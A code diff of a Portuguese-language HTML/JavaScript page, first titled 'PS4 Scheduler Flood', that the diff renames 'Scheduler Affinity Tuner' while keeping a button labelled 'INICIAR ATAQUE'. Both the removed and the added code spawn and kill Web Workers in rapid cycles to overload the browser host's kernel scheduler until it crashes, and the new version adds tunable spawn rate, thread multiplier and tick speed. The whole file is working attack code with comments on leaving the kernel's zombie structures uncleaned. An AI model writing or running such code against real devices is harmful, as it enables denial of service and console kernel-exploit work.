@@ -1,131 +1,114 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Scheduler Flood (Auto-Loop)</title>
+    <title>PS4 Scheduler Stress Tuner</title>
     
 </head>
 <body>
 
-    <h1>KERNEL SCHEDULER FLOOD (Auto-Loop)</h1>
-    <div id="status">Aguardando início...</div>
-    <button onclick="startLoop()">INICIAR ATAQUE (Loop Infinito)</button>
-    <br><br>
-    <div id="log"></div>
+    <h1>SCHEDULER AFFINITY TUNER</h1>
+
+    <div class="control-panel">
+        <div class="input-group">
+            <label>Threads (Multiplicador):</label>
+            <input type="number" id="mult" value="8"> <span>x CPU Cores</span>
+        </div>
+        <div class="input-group">
+            <label>Spawn por Tick:</label>
+            <input type="number" id="rate" value="10"> <span>Workers</span>
+        </div>
+        <div class="input-group">
+            <label>Velocidade (ms):</label>
+            <input type="number" id="speed" value="4"> <span>ms (Menor = Mais Rápido)</span>
+        </div>
+        
+        <br>
+        <button id="btn-start" onclick="toggleStress()">INICIAR ATAQUE</button>
+    </div>
+
+    <div id="status">PARADO</div>
+    <div id="stats">Workers Ativos: 0 | Ciclos: 0</div>
 
     <script>
-        // ==============================================================
-        // CONFIGURAÇÃO DE LOG (Opcional - Configure o IP do seu PC)
-        // ==============================================================
-        const LOG_SERVER_IP = "192.168.0.XX"; // <-- Mude isso se usar o server.py
-        const LOG_SERVER_PORT = "8080";
-        // ==============================================================
-
-        let cycleCount = 0;
         let isRunning = false;
+        let timer = null;
         let workers = [];
+        let cycle = 0;
         
-        // Blob do Worker: Loop infinito leve para segurar a thread no kernel
-        // Usamos setInterval para manter o worker ativo mas permitindo interrupções
-        const workerBlob = new Blob(["setInterval(()=>{}, 100)"], {type:'text/javascript'});
-        const workerUrl = URL.createObjectURL(workerBlob);
+        // Worker Blob: Mantém a thread ocupada
+        const blob = new Blob(["setInterval(()=>{}, 100)"], {type:'text/javascript'});
+        const url = URL.createObjectURL(blob);
 
-        function logger(msg) {
-            const el = document.getElementById('log');
-            const time = new Date().toLocaleTimeString();
-            const line = `[${time}] ${msg}`;
+        function toggleStress() {
+            const btn = document.getElementById('btn-start');
+            const status = document.getElementById('status');
+
+            if (isRunning) {
+                // PARAR
+                clearInterval(timer);
+                killAll();
+                isRunning = false;
+                btn.innerText = "INICIAR ATAQUE";
+                btn.style.background = "#c00";
+                status.innerText = "PARADO (Limpando...)";
+                status.style.color = "#888";
+            } else {
+                // INICIAR
+                const mult = parseInt(document.getElementById('mult').value);
+                const rate = parseInt(document.getElementById('rate').value);
+                const speed = parseInt(document.getElementById('speed').value);
+
+                isRunning = true;
+                btn.innerText = "PARAR";
+                btn.style.background = "#333";
+                status.innerText = "EXECUTANDO... (Aguarde o Crash)";
+                status.style.color = "#f00";
+                
+                runLoop(mult, rate, speed);
+            }
+        }
+
+        function runLoop(multiplier, spawnRate, intervalMs) {
+            const maxWorkers = navigator.hardwareConcurrency * multiplier;
             
-            // Log na tela
-            const div = document.createElement('div');
-            div.innerText = line;
-            if(msg.includes("CICLO")) div.className = "cycle-header";
-            el.appendChild(div);
-            el.scrollTop = el.scrollHeight;
-
-            // Log via Rede (Tenta enviar para o PC antes do crash)
-            try {
-                fetch(`http://${LOG_SERVER_IP}:${LOG_SERVER_PORT}`, {
-                    method: "POST",
-                    body: line,
-                    mode: 'no-cors',
-                    keepalive: true
-                }).catch(()=>{});
-            } catch(e){}
-        }
-
-        function updateStatus(msg) {
-            document.getElementById('status').innerText = msg;
-        }
-
-        function startLoop() {
-            if(isRunning) return;
-            isRunning = true;
-            logger(">>> INICIANDO LOOP DE STRESS DO SCHEDULER <<<");
-            runBatch();
-        }
-
-        // Esta função roda um lote de stress, para, e chama a si mesma
-        function runBatch() {
-            cycleCount++;
-            updateStatus(`Executando CICLO #${cycleCount} (Pressão Máxima)...`);
-            logger(`--- INICIANDO CICLO ${cycleCount} ---`);
-
-            // Configuração agressiva
-            const MAX_WORKERS = navigator.hardwareConcurrency * 6; // Sobrecarga (ex: 48 threads em 8 cores)
-            const SPAWN_RATE = 5; // Workers por tick
-            const TICK_RATE = 5;  // ms
-
-            // Intervalo de Ataque
-            const attackInterval = setInterval(() => {
+            timer = setInterval(() => {
                 try {
-                    // 1. Fase de Spawn (Criação)
-                    for(let i=0; i<SPAWN_RATE; i++) {
-                        workers.push(new Worker(workerUrl));
+                    // 1. Fase de Spawn (Criação Agressiva)
+                    for(let i=0; i < spawnRate; i++) {
+                        workers.push(new Worker(url));
                     }
 
                     // 2. Fase de Kill (Churning)
-                    // Matamos threads antigas para forçar o scheduler a re-calcular afinidade
-                    // Mantemos o sistema sempre perto do limite
-                    if(workers.length > MAX_WORKERS) {
-                        // Mata metade para criar "buracos" na tabela de processos
-                        while(workers.length > (MAX_WORKERS / 2)) {
+                    // Se passar do limite, mata METADE de uma vez para causar choque no Scheduler
+                    if(workers.length > maxWorkers) {
+                        let killCount = 0;
+                        while(workers.length > (maxWorkers / 2)) {
                             const w = workers.shift();
-                            w.terminate(); 
+                            w.terminate();
+                            killCount++;
                         }
+                        cycle++;
                     }
+
+                    // Atualiza stats na tela
+                    document.getElementById('stats').innerText = 
+                        `Workers Ativos: ${workers.length} | Ciclos de Churn: ${cycle}`;
+
                 } catch(e) {
-                    logger(`Erro de Alocação (Sinal Bom!): ${e.message}`);
+                    // Se falhar a alocação, geralmente estamos perto do crash
+                    // Apenas limpamos um pouco para continuar batendo
+                    if(workers.length > 10) workers.shift().terminate();
                 }
-            }, TICK_RATE);
-
-            // Duração do lote: 2500ms (Tempo suficiente para sujar a memória, curto o suficiente para repetir rápido)
-            setTimeout(() => {
-                clearInterval(attackInterval);
-                cleanupAndRestart();
-            }, 2500);
+            }, intervalMs);
         }
 
-        function cleanupAndRestart() {
-            logger(`Ciclo ${cycleCount} finalizado. Limpando...`);
-            
-            // Mata todos os workers restantes deste ciclo
-            // Isso gera uma onda massiva de eventos "thread exit" no kernel
-            while(workers.length > 0) {
-                const w = workers.shift();
-                w.terminate();
-            }
-
-            // O SEGREDO DO "3x":
-            // Não damos tempo para o Kernel limpar totalmente as estruturas "zombie".
-            // Reiniciamos quase imediatamente.
-            updateStatus(`Recarregando para CICLO #${cycleCount + 1}...`);
-            
-            setTimeout(() => {
-                runBatch(); // Recursão infinita
-            }, 200); // 200ms de pausa apenas
+        function killAll() {
+            workers.forEach(w => w.terminate());
+            workers = [];
+            cycle = 0;
+            document.getElementById('stats').innerText = "Workers Ativos: 0 | Sistema Limpo";
         }
-
     </script>
 </body>
 </html>
